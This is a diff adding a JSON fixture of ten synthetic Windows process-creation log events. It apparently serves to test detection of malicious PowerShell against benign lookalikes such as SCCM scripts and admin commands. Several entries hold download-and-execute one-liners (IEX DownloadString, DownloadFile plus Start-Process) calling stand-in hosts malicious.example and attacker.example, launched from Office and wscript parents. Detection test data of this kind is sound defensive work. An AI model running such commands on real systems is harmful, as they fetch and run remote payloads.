@@ -1,0 +1,122 @@
+[
+  {
+    "@timestamp": "2026-09-14T02:14:11.321Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-WORKSTATION-055",
+    "user.name": "jdoe",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX ((New-Object Net.WebClient).DownloadString('https://malicious.example/stage2.ps1'))",
+    "process.parent.name": "winword.exe",
+    "process.parent.pid": 4120,
+    "process.pid": 7312
+  },
+  {
+    "@timestamp": "2026-09-14T02:14:48.883Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-WORKSTATION-055",
+    "user.name": "jdoe",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell -c Invoke-WebRequest -Uri https://malicious.example/beacon.ps1 -OutFile $env:TEMP\\b.ps1; & $env:TEMP\\b.ps1",
+    "process.parent.name": "powershell.exe",
+    "process.parent.pid": 7312,
+    "process.pid": 7404
+  },
+  {
+    "@timestamp": "2026-09-14T03:02:17.044Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-ENDPOINT-131",
+    "user.name": "SYSTEM",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('https://internal-artifacts.corp.local/sccm/apps.ps1')",
+    "process.parent.name": "ccmexec.exe",
+    "process.parent.pid": 2104,
+    "process.pid": 9188
+  },
+  {
+    "@timestamp": "2026-09-14T03:12:55.512Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-ADMIN-02",
+    "user.name": "admin",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell.exe -NoProfile -Command Get-Service -Name W3SVC",
+    "process.parent.name": "explorer.exe",
+    "process.parent.pid": 980,
+    "process.pid": 5420
+  },
+  {
+    "@timestamp": "2026-09-14T03:30:02.187Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-WORKSTATION-089",
+    "user.name": "msmith",
+    "process.name": "pwsh.exe",
+    "process.command_line": "pwsh -NoProfile -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('https://attacker.example/x.ps1')",
+    "process.parent.name": "outlook.exe",
+    "process.parent.pid": 3344,
+    "process.pid": 6612
+  },
+  {
+    "@timestamp": "2026-09-14T04:11:40.902Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-DEV-14",
+    "user.name": "dev1",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell.exe -Command Install-Module -Name Pester -Scope CurrentUser -Force",
+    "process.parent.name": "code.exe",
+    "process.parent.pid": 7700,
+    "process.pid": 8812
+  },
+  {
+    "@timestamp": "2026-09-14T04:45:19.015Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-WORKSTATION-200",
+    "user.name": "ablack",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell.exe -c \"$u='https://attacker.example/a'; IEX (New-Object Net.WebClient).DownloadString($u)\"",
+    "process.parent.name": "wscript.exe",
+    "process.parent.pid": 4040,
+    "process.pid": 2244
+  },
+  {
+    "@timestamp": "2026-09-14T05:03:08.771Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-WORKSTATION-055",
+    "user.name": "jdoe",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell -ep bypass -c (New-Object System.Net.WebClient).DownloadFile('https://attacker.example/x.exe','C:\\Users\\Public\\x.exe'); Start-Process C:\\Users\\Public\\x.exe",
+    "process.parent.name": "powershell.exe",
+    "process.parent.pid": 7404,
+    "process.pid": 9900
+  },
+  {
+    "@timestamp": "2026-09-14T05:30:44.223Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-ADMIN-02",
+    "user.name": "admin",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell.exe -Command Restart-Service Spooler",
+    "process.parent.name": "mmc.exe",
+    "process.parent.pid": 2240,
+    "process.pid": 3100
+  },
+  {
+    "@timestamp": "2026-09-14T06:00:11.000Z",
+    "event.code": "4688",
+    "event.action": "process_creation",
+    "host.name": "WIN-ENDPOINT-055",
+    "user.name": "SYSTEM",
+    "process.name": "powershell.exe",
+    "process.command_line": "powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('https://repo.internal.corp.local/baseline/v1.ps1')",
+    "process.parent.name": "ccmexec.exe",
+    "process.parent.pid": 2110,
+    "process.pid": 4455
+  }
+]
